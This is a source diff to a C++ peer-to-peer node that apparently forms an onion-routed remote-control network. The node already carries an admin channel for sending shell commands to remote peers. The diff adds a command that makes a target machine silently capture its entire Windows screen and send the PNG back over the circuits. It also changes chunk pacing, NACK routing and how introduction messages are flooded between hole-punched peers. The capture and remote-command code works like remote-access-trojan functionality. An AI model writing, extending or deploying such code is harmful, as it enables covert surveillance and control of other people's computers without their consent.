@@ -3,6 +3,8 @@
 //
 
 #include "../headers/Node.h"
+#define STB_IMAGE_WRITE_IMPLEMENTATION
+#include "../../extern_libs/stb_image_write.h"
 
 
 Node::Node(const uint16_t listen_port)
@@ -272,10 +274,25 @@ void Node::send_shell_cmd(std::string cmd, NodeId to) {
         self->send_chunked(to, proto::to_bytes(cmd), SHELL_CMD);
     });
 }
+void Node::send_scrsht_cmd(NodeId to) {
+    std::string cmd = "null";
+    asio::post(io_, [self = shared_from_this(), cmd = std::move(cmd), to = std::move(to)]() {
+        if (!self->circuit_by_dst_.contains(to)) {
+            log_warn("[ADMIN] No circuit to {}", to);
+            return;
+        }
+        self->send_chunked(to, proto::to_bytes(cmd), SCRSHT);
+    });
+}
 
 void Node::set_shell_out_callback(std::function<void(ShellOut)> cb) {
     std::lock_guard lock(shell_mutex_);
     shell_out_cb_ = std::move(cb);
+}
+
+void Node::set_scrsht_out_callback(std::function<void(std::vector<uint8_t>)> cb) {
+    std::lock_guard lock(shell_mutex_);
+    scrsht_out_cb_ = std::move(cb);
 }
 
 std::vector<NodeId> Node::get_known_clients() const {
@@ -307,14 +324,31 @@ void Node::reply_chunked(const NodeId& src, std::vector<uint8_t> data, ContentTy
     auto transfer_id = proto::random_tx_id();
     uint32_t total_chunks = std::max(1u, static_cast<uint32_t>((data.size() + CHUNK_SIZE - 1) / CHUNK_SIZE));
 
+    OutgoingTransfer transfer;
+    transfer.dst          = src;
+    transfer.content_type = content_type;
+    transfer.total_chunks = total_chunks;
+    transfer.circuit_id   = circuit_id;
+
     for (uint32_t i = 0; i < total_chunks; i++) {
         size_t start = i * CHUNK_SIZE;
         size_t end   = std::min(start + CHUNK_SIZE, data.size());
-        std::vector<uint8_t> raw(data.begin() + start, data.begin() + end);
-        proto::ChunkMeta chunk{transfer_id, i, total_chunks, content_type, proto::b64_encode(raw)};
-        send_reply_via_circuit(circuit_id, proto::dump_compact(proto::msg_chunk(node_id_, chunk)));
+        transfer.chunks.emplace_back(data.begin() + start, data.begin() + end);
     }
+
+    outgoing_transfers_[transfer_id] = std::move(transfer);
+    auto xfer_timer = std::make_unique<asio::steady_timer>(io_);
+    xfer_timer->expires_after(outgoing_transfer_timeout_sec);
+    xfer_timer->async_wait([self = shared_from_this(), transfer_id](const std::error_code& ec) {
+        if (ec) return;
+        if (self->outgoing_transfers_.erase(transfer_id))
+            log_warn("[CHUNK] Reply transfer {} sender-timeout — cache freed", transfer_id);
+        self->outgoing_transfer_timers_.erase(transfer_id);
+    });
+    outgoing_transfer_timers_[transfer_id] = std::move(xfer_timer);
+
     log_info("[CHUNK] Replied {} chunks (transfer {}) to {}", total_chunks, transfer_id, src);
+    schedule_chunk_sender(transfer_id, 0);
 }
 
 void Node::send_text(const udp::endpoint& target, std::string text) {
@@ -529,11 +563,15 @@ void Node::on_req_conns(const udp::endpoint& from, const proto::Envelope& env) {
     log_info("Sent REQ_CONNS_ACK to {}:{}", registeringCli.address().to_string(), registeringCli.port());
 
     for (auto membr : peers){
-        const json jMembr = proto::msg_introduce(curP, membr.tkn); //introduce JSON for existing
-        auto epMembr = membr.ep;
+        const json jMembr = proto::msg_introduce(curP, membr.tkn, membr.peerId);
         const auto dataMembr = proto::dump_compact(jMembr);
-        send_text(epMembr, dataMembr);
-        log_debug("Sent INTRODUCE to {}:{}", epMembr.address().to_string(), epMembr.port());
+        if (membr.peerId == node_id_) {
+            remember_token(curP.peerId, membr.tkn, 6000);
+            start_punch(curP, 4000, 250, membr.tkn);
+        } else {
+            broadcast(dataMembr);
+            log_debug("Broadcast INTRODUCE for target {}", membr.peerId);
+        }
     }
 }
 
@@ -638,14 +676,32 @@ void Node::prune_tokens() {
         if (it->second.expires <= now) it = token_cache_.erase(it);
         else ++it;
     }
+    for (auto it = seen_introduce_ids_.begin(); it != seen_introduce_ids_.end(); ) {
+        if (now - it->second > std::chrono::seconds(60)) it = seen_introduce_ids_.erase(it);
+        else ++it;
+    }
 }
 
 void Node::on_introduce(const udp::endpoint& from, const proto::Envelope& env) {
     if (env.src != "ROOT")
         log_warn("INTRODUCE from unexpected source: {} (body: {})", env.src, env.body.dump());
 
-    const json& body = env.body;
+    // Dedup: ignore if we've already forwarded/processed this flood message
+    if (seen_introduce_ids_.count(env.tx)) return;
+    seen_introduce_ids_[env.tx] = Clock::now();
 
+    const json& body = env.body;
+    const std::string target_id = body.value("target_id", "");
+
+    if (!target_id.empty() && target_id != node_id_) {
+        // Not for us — forward to all connected peers except the one we received it from
+        const std::string data = proto::dump_compact(proto::make_envelope(env.type, env.src, env.tx, body));
+        for (auto& [id, conn] : connections_) {
+            if (conn && conn->connected && conn->ep != from)
+                send_text(conn->ep, data);
+        }
+        return;
+    }
 
     const std::string peer_id = body.at("peer").at("id").get<std::string>();
     const std::string pIp     = body.at("peer").at("ip").get<std::string>();
@@ -654,7 +710,6 @@ void Node::on_introduce(const udp::endpoint& from, const proto::Envelope& env) {
     const int timeout  = body.value("timeout_ms", 4000);
     const int punch_ms = body.value("punch_ms", 250);
     const std::string tkn = body.at("token").get<std::string>();
-
 
     std::error_code ec;
     auto pAddr = asio::ip::make_address(pIp, ec);
@@ -910,11 +965,16 @@ void Node::handle_register_ack(const std::string& tx, const PeerInfo& curP, cons
     log_info("Sent REGISTER_ACK to {}:{}", registeringCli.address().to_string(), registeringCli.port());
 
     for (const auto& membr : peers){
-        const json jMembr = proto::msg_introduce(curP, membr.tkn); //introduce JSON for existing
-        auto epMembr = membr.ep;
+        const json jMembr = proto::msg_introduce(curP, membr.tkn, membr.peerId);
         const auto dataMembr = proto::dump_compact(jMembr);
-        send_text(epMembr, dataMembr);
-        log_debug("Sent INTRODUCE to {}:{}", epMembr.address().to_string(), epMembr.port());
+        if (membr.peerId == node_id_) {
+            // Root is the target — self-process directly without waiting for flood
+            remember_token(curP.peerId, membr.tkn);
+            start_punch(curP, 4000, 250, membr.tkn);
+        } else {
+            broadcast(dataMembr);
+            log_debug("Broadcast INTRODUCE for target {}", membr.peerId);
+        }
     }
 
 } /* for root - handles register_ack -
@@ -1000,6 +1060,39 @@ void Node::punch(const std::string& peerId, const int timeout, const int punch_m
     });
 }
 
+void Node::schedule_chunk_sender(std::string transfer_id, uint32_t index) {
+    auto it = outgoing_transfers_.find(transfer_id);
+    if (it == outgoing_transfers_.end()) return;
+    auto& transfer = it->second;
+    if (index >= transfer.total_chunks) return;
+
+    // Send this chunk
+    auto& raw = transfer.chunks[index];
+    proto::ChunkMeta meta{transfer_id, index, transfer.total_chunks, transfer.content_type, proto::b64_encode(raw)};
+    auto msg = proto::dump_compact(proto::msg_chunk(node_id_, meta));
+
+    if (transfer.circuit_id.empty()) {
+        auto cit = circuit_by_dst_.find(transfer.dst);
+        if (cit == circuit_by_dst_.end()) {
+            log_warn("[CHUNK] Circuit to {} gone during send of transfer {}", transfer.dst, transfer_id);
+            return;
+        }
+        send_via_circuit(cit->second, msg);
+    } else {
+        send_reply_via_circuit(transfer.circuit_id, msg);
+    }
+
+    if (index + 1 >= transfer.total_chunks) return;
+
+    // Schedule next chunk after a short delay to pace the stream
+    auto timer = std::make_shared<asio::steady_timer>(io_);
+    timer->expires_after(chunk_send_interval_ms);
+    timer->async_wait([self = shared_from_this(), transfer_id, index, timer](const std::error_code& ec) mutable {
+        if (ec) return;
+        self->schedule_chunk_sender(std::move(transfer_id), index + 1);
+    });
+}
+
 void Node::send_chunked(const NodeId& dst, std::vector<uint8_t> data, ContentType content_type) {
     auto transfer_id = proto::random_tx_id();
     uint32_t total_chunks = (data.size() + CHUNK_SIZE - 1) / CHUNK_SIZE;
@@ -1018,17 +1111,11 @@ void Node::send_chunked(const NodeId& dst, std::vector<uint8_t> data, ContentTyp
     for (uint32_t i = 0; i < total_chunks; i++) {
         size_t start = i * CHUNK_SIZE;
         size_t end = std::min(start + CHUNK_SIZE, data.size());
-        std::vector<uint8_t> raw_chunk(data.begin() + start, data.begin() + end);
-        transfer.chunks.push_back(raw_chunk);
-
-        proto::ChunkMeta chunk{transfer_id, i, total_chunks, content_type, proto::b64_encode(raw_chunk)};
-        auto msg = proto::msg_chunk(node_id_, chunk);
-        send_via_circuit(circuit_id, proto::dump_compact(msg));
+        transfer.chunks.emplace_back(data.begin() + start, data.begin() + end);
     }
 
     outgoing_transfers_[transfer_id] = std::move(transfer);
 
-    // Sender-side timeout: if CHUNK_ACK never arrives, free the cache
     auto xfer_timer = std::make_unique<asio::steady_timer>(io_);
     xfer_timer->expires_after(outgoing_transfer_timeout_sec);
     xfer_timer->async_wait([self = shared_from_this(), transfer_id](const std::error_code& ec) {
@@ -1039,7 +1126,8 @@ void Node::send_chunked(const NodeId& dst, std::vector<uint8_t> data, ContentTyp
     });
     outgoing_transfer_timers_[transfer_id] = std::move(xfer_timer);
 
-    log_info("[CHUNK] Sent {} chunks for transfer {}", total_chunks, transfer_id);
+    log_info("[CHUNK] Sending {} chunks for transfer {}", total_chunks, transfer_id);
+    schedule_chunk_sender(transfer_id, 0);
 }
 
 void Node::on_linkup(const udp::endpoint& from, const proto::Envelope& env) { //root function
@@ -1115,18 +1203,20 @@ void Node::on_chunk(const udp::endpoint& from, const proto::Envelope& env)
 
     // Helper: collect missing indices and send NACK via circuit
     auto send_nack = [this, transfer_id, &msg]() {
-        auto circuit_it = received_circuit_by_src_.find(msg.src);
-        if (circuit_it == received_circuit_by_src_.end()) {
-            log_warn("[CHUNK] Can't send NACK — no circuit from {}", msg.src);
-            return;
-        }
         std::vector<uint32_t> missing;
         for (uint32_t i = 0; i < msg.chunk_num; i++)
             if (!msg.chunks.count(i)) missing.push_back(i);
         if (missing.empty()) return;
         log_info("[CHUNK] Sending NACK for {} missing chunks of transfer {}", missing.size(), transfer_id);
-        auto nack = proto::msg_chunk_nack(node_id_, transfer_id, missing);
-        send_reply_via_circuit(circuit_it->second, proto::dump_compact(nack));
+        auto nack_msg = proto::dump_compact(proto::msg_chunk_nack(node_id_, transfer_id, missing));
+        auto reply_it = received_circuit_by_src_.find(msg.src);
+        auto dst_it   = circuit_by_dst_.find(msg.src);
+        if (reply_it != received_circuit_by_src_.end())
+            send_reply_via_circuit(reply_it->second, nack_msg);
+        else if (dst_it != circuit_by_dst_.end())
+            send_via_circuit(dst_it->second, nack_msg);
+        else
+            log_warn("[CHUNK] Can't send NACK — no circuit to {}", msg.src);
     };
 
     // On first chunk arrival, arm the recurring NACK retry timer
@@ -1148,24 +1238,28 @@ void Node::on_chunk(const udp::endpoint& from, const proto::Envelope& env)
                 return;
             }
 
-            auto circuit_it = self->received_circuit_by_src_.find(rmsg.src);
-            if (circuit_it == self->received_circuit_by_src_.end()) {
-                log_warn("[CHUNK] Transfer {} — no reply circuit, dropping", transfer_id);
-                self->incoming_msgs_.erase(transfer_id);
-                self->chunk_timers_.erase(transfer_id);
-                return;
-            }
-
             std::vector<uint32_t> missing;
             for (uint32_t i = 0; i < rmsg.chunk_num; i++)
                 if (!rmsg.chunks.count(i)) missing.push_back(i);
 
             if (!missing.empty()) {
+                auto reply_it = self->received_circuit_by_src_.find(rmsg.src);
+                auto dst_it   = self->circuit_by_dst_.find(rmsg.src);
+                if (reply_it == self->received_circuit_by_src_.end() &&
+                    dst_it   == self->circuit_by_dst_.end()) {
+                    log_warn("[CHUNK] Transfer {} — no circuit to send NACK, dropping", transfer_id);
+                    self->incoming_msgs_.erase(transfer_id);
+                    self->chunk_timers_.erase(transfer_id);
+                    return;
+                }
                 rmsg.nack_retries++;
                 log_info("[CHUNK] NACK #{} — {}/{} missing for transfer {}",
                          rmsg.nack_retries, missing.size(), rmsg.chunk_num, transfer_id);
-                auto nack = proto::msg_chunk_nack(self->node_id_, transfer_id, missing);
-                self->send_reply_via_circuit(circuit_it->second, proto::dump_compact(nack));
+                auto nack_msg = proto::dump_compact(proto::msg_chunk_nack(self->node_id_, transfer_id, missing));
+                if (reply_it != self->received_circuit_by_src_.end())
+                    self->send_reply_via_circuit(reply_it->second, nack_msg);
+                else
+                    self->send_via_circuit(dst_it->second, nack_msg);
             }
 
             // Reschedule for next retry
@@ -1246,6 +1340,30 @@ void Node::on_chunk(const udp::endpoint& from, const proto::Envelope& env)
         }
         if (cb) cb(std::move(exec));
     }
+    else if (ct == SCRSHT){
+        int w, h;
+        auto screen_pixels = take_screenshot(w, h);
+        auto png = to_png(screen_pixels, w, h);
+        auto png_msg = proto::msg_scrsht(node_id_, png, w, h);
+        reply_chunked(msg.src, proto::to_bytes(proto::dump_compact(png_msg)), SCRSHT_OUT);
+    }
+    else if (ct == SCRSHT_OUT) {
+        std::string exec_str(full_data.begin(), full_data.end());
+        if (exec_str.empty()) {log_error("Got empty out from shell command"); return;}
+        auto exec_j = json::parse(exec_str);
+        int h = exec_j["h"], w = exec_j["w"];
+        auto img_decoded = proto::b64_decode(exec_j["out"].get<std::string>());
+        if (!img_decoded) { log_error("Failed to decode screenshot PNG data"); return; }
+        std::vector<uint8_t> image_vec = std::move(*img_decoded);
+        std::function<void(std::vector<uint8_t>)> cb;
+        {
+            std::lock_guard lock(scrsht_mutex_);
+            scrsht_outs_.push_back(image_vec);
+            cb = scrsht_out_cb_;
+        }
+        if (cb) cb(std::move(image_vec));
+
+    }
     else {
         log_info("[FILE from {}]: {} bytes received", msg.src, full_data.size());
     }
@@ -1278,16 +1396,11 @@ void Node::on_chunk_nack(const udp::endpoint& from, const proto::Envelope& env) 
         return;
     }
 
-    auto circuit_it = circuit_by_dst_.find(transfer_it->second.dst);
-    if (circuit_it == circuit_by_dst_.end()) {
-        log_warn("[CHUNK_NACK] No circuit to {} for retransmit", transfer_it->second.dst);
-        return;
-    }
+    const OutgoingTransfer& transfer = transfer_it->second;
 
     log_info("[CHUNK_NACK] Retransmitting {}/{} missing chunks for transfer {}",
-             missing.size(), transfer_it->second.total_chunks, transfer_id);
+             missing.size(), transfer.total_chunks, transfer_id);
 
-    const OutgoingTransfer& transfer = transfer_it->second;
     for (uint32_t i : missing) {
         if (i >= transfer.total_chunks) {
             log_warn("[CHUNK_NACK] Invalid chunk index {} in retransmit request", i);
@@ -1295,8 +1408,20 @@ void Node::on_chunk_nack(const udp::endpoint& from, const proto::Envelope& env) 
         }
         proto::ChunkMeta chunk{transfer_id, i, transfer.total_chunks,
             transfer.content_type, proto::b64_encode(transfer.chunks[i])};
-        auto msg = proto::msg_chunk(node_id_, chunk);
-        send_via_circuit(circuit_it->second, proto::dump_compact(msg));
+        auto msg = proto::dump_compact(proto::msg_chunk(node_id_, chunk));
+
+        if (!transfer.circuit_id.empty()) {
+            // Reply transfer — use the stored reply circuit
+            send_reply_via_circuit(transfer.circuit_id, msg);
+        } else {
+            // Initiated transfer — route forward through circuit_by_dst_
+            auto circuit_it = circuit_by_dst_.find(transfer.dst);
+            if (circuit_it == circuit_by_dst_.end()) {
+                log_warn("[CHUNK_NACK] No circuit to {} for retransmit", transfer.dst);
+                return;
+            }
+            send_via_circuit(circuit_it->second, msg);
+        }
     }
 }
 
@@ -1982,6 +2107,43 @@ void Node::on_new_root(const udp::endpoint& from, const proto::Envelope& env) {
             send_text(conn->ep, fwd);
 }
 
+// -------------------------- Admin capabilities --------------------------
+
+std::vector<uint8_t> Node::take_screenshot(int& out_w, int& out_h) {
+    HDC screen = GetDC(nullptr);
+    out_w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+    out_h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+    int x = GetSystemMetrics(SM_XVIRTUALSCREEN);
+    int y = GetSystemMetrics(SM_YVIRTUALSCREEN);
+
+    HDC mem = CreateCompatibleDC(screen);
+    HBITMAP bmp = CreateCompatibleBitmap(screen, out_w, out_h);
+    HBITMAP old = static_cast<HBITMAP>(SelectObject(mem, bmp));
+    BitBlt(mem, 0, 0, out_w, out_h, screen, x, y, SRCCOPY);
+    SelectObject(mem, old); // deselect bmp — required before GetDIBits
+
+    BITMAPINFOHEADER bi{sizeof(bi), out_w, -out_h, 1, 32};
+    std::vector<uint8_t> buf(out_w*out_h*4);
+    GetDIBits(screen, bmp, 0, out_h, buf.data(), reinterpret_cast<BITMAPINFO*>(&bi), DIB_RGB_COLORS);
+
+    // GetDIBits returns BGRA; swap to RGBA for stb_image_write
+    for (size_t i = 0; i < buf.size(); i += 4)
+        std::swap(buf[i], buf[i + 2]);
+
+    DeleteObject(bmp);
+    DeleteDC(mem);
+    ReleaseDC(nullptr, screen);
+    return buf;
+}
+
+std::vector<uint8_t> Node::to_png(const std::vector<uint8_t> &bit_data, int w, int h) {
+    std::vector<uint8_t> out;
+    stbi_write_png_to_func([](void* ctx, void*data, int size) {
+        auto* v = static_cast<std::vector<uint8_t>*>(ctx);
+        v->insert(v->end(), (uint8_t*)data, (uint8_t*)data+size);
+    }, &out, w, h, 4, bit_data.data(), w*4);
+    return out;
+}
 
 // ------------------------ onion routing ------------------------
 
@@ -2015,12 +2177,10 @@ void Node::on_introduce_req(const udp::endpoint& from, const proto::Envelope& en
     // Tell requester about target (requester will punch target)
     req_peer.tkn = token;
     tgt_peer.tkn = token;
-    const json intro_to_req = proto::msg_introduce(tgt_peer, token);
-    send_text(req_peer.ep, proto::dump_compact(intro_to_req));
+    broadcast(proto::dump_compact(proto::msg_introduce(tgt_peer, token, req_peer.peerId)));
 
     // Tell target about requester (target will punch requester) - simultaneous open
-    const json intro_to_tgt = proto::msg_introduce(req_peer, token);
-    send_text(tgt_peer.ep, proto::dump_compact(intro_to_tgt));
+    broadcast(proto::dump_compact(proto::msg_introduce(req_peer, token, tgt_peer.peerId)));
 
     log_info("[ROOT] Introduced {} <-> {}", requester_id, target_id);
 }
